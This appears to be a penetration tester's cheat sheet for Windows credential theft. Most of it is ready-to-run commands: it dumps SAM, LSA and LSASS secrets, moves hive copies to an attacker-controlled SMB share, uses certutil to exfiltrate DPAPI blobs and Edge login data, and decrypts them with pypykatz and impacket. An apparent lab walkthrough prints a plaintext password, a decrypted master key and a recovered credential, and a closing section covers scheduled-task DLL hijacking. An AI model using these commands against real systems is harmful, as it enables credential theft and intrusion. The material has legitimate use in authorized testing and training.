# Windows - Exploitation tips

% windows

## Manual SAM db dumping
```
# copy registry hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# create a share with smbserver.py
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <SHARENAME> <PATH TO FOLDER>

# Move hive copies to share
move <FILE> \\<ATK IP>\<SHARENAME>

# dump hashes with secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# if necessary, crack hashes
```

## Remote LSA dumping
```
# Remote LSA dump
crackmapexec smb <TARGET IP> --local-auth -u <USER> -p <PASSWORD> --lsa
```

## Remote SAM dumping
```
# Remote SAM dump

crackmapexec smb <TARGET IP> --local-auth -u <USER> -p <PASSWORD> --sam
```

## LSASS dumping
```
# dumping LSASS
# 1. Find lsass.exe pid
# CMD
tasklist /svc
# Pwsh
Get-Process lsass

# 2. Create a dump, pwsh
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# 3. Pypykatz to extract creds
pypykatz lsa minidump <PATH/TO/DUMP>

# 4. Look at the MSV? WDIGEST, KERBEROS, DPAPI sections
# 5. Crack if necssary
```

# Decrypt secrets using a user's DPAPI master key + compromised user's password
```
# Addendum : DPAPI master key
# Those are encrypted using a user-specific master key derived from the user's secret
1. Download locally the encrypted user's DPAPI master key
- Location : C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
- Note the user's SID for later use
- use 'gci -force' to list
  - Usually there are 2 files named using a U=GUID
    - one is the DPAPI secret encrypted using the Domain key
    - the other, what we want, is the same but encrypted using the user's key
- if you are using powershell in constrainted mode and .NET scripting is not possible, use a LOLBIN to retrieve the 2 files :
  - b64 encode DPAPI secret : certutil -encode <GUID name file> <GUID name file>.b64
  - gc <UUID name file>.b64 > copy the file content locally
  - 'b64 -d' the file 

2. Download stored DPAPI encrypted blobs
- Common locations :
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
- Edge :
C:\Users\$USER\AppData\Local\Microsoft\Edge\User Data\Default\Login Data

Encode using certutil an exfiltrate + b64 decode

3.(Optional) Identify the b64 blobs encrypted by the DPAPI key within the retrived files + b64 decrypt
Check the DPAPI magic bytes at the beginning of the blobs to validate this steps
4. Decrypt the blobs using pypykatz
pypykatz dpapi describe blob <blob name> > note the masterkey_guid and use the corresponding DPAPI secret blob for the given blob for the next steps.
- generate prekey using password
pypykatz dpapi prekey password <UserSID> <User's password> > <Prekey file>
- Decrypt the DPAPI master key file
pypykatz dpapi <DPAPI master key file with GUID name> <Prekey file> -o masterkey_file
- Decrypt encrypted blob, example chrome:
pypykatz dpapi chrom --logindata Login.sqlite masterkey_file state
```

# Decrypt secrets using a user's DPAPI master key - practical example
```
- Windows often stores user secrets in folders under AppData\Roaming\Microsoft , which includes subdirectories such as Credentials and Protect . These contain the encrypted credential and the master key

# cd AppData\Roaming\Microsoft\Credentials 
# ls
Directory: C:\Users\[User]\AppData\Roaming\Microsoft\Credentials

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
drw-rw-rw-         1/29/2025 10:13 AM            .
drw-rw-rw-         1/29/2025 10:13 AM            ..
-rw-rw-rw-         1/29/2025  8:13 AM          398 772275FAD58525253490A9B0039791D3


Directory: C:\Users\[User]\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
drw-rw-rw-         1/29/2025 10:13 AM            .
drw-rw-rw-         1/29/2025 10:13 AM            ..
-rw-rw-rw-         1/29/2025  8:09 AM          740 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-         1/29/2025  7:53 AM          900 BK-VOLEUR
-rw-rw-rw-         1/29/2025  7:53 AM           24 Preferred

# get 08949382-134f-4c63-b93c-ce52efc0aa88 

Downloads the master key file. 
We then return to the Credentials folder to download the credential blob, which contains the encrypted user credentials protected by the master key

# /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials
-rw-rw-rw- 398 Wed Jan 29 08:13:50 2025 772275FAD58525253490A9B0039791D3
# get 77..

- with both the credential file and the master key , we can decrypt the stored password.
we first decrypt the master key using Impacket’s DPAPI module. The masterkey command uses the user’s SID and password to unlock the DPAPI master key file
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21- 3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
...
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a 9e240ce2b8a9dfb92a0d15969ccae6f550650a83
...

With this decrypted key, we can unlock the credential blob we had previously downloaded.
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a 9e240ce2b8a9dfb92a0d15969ccae6f550650a83

[CREDENTIAL] 
..
Username : jeremy.combs
Unknown : qT3V9pLXyN7W4m 
```

## DLL tips
```
# DLL tips
# Scheduled-task DLL hiajck
- Scheduled-Task DLL Hijacks Are a User-Impersonation Primitive : Any user that can write to the input directory of a scheduled task running as another principal effectively executes as that principal. On Logging the input was a zip file; the task unpacked it into Program Files\...\bin\ and loaded the DLL.
- Tame Subprocesses in Looping Tasks : Never spawn an interactive-prone binary (certreq, net use, netsh) from inside a DLL loaded by a repeating task without -f//y//quiet flags and < NUL. A single hung child will freeze the DLL load slot for the duration of the box.
  
```
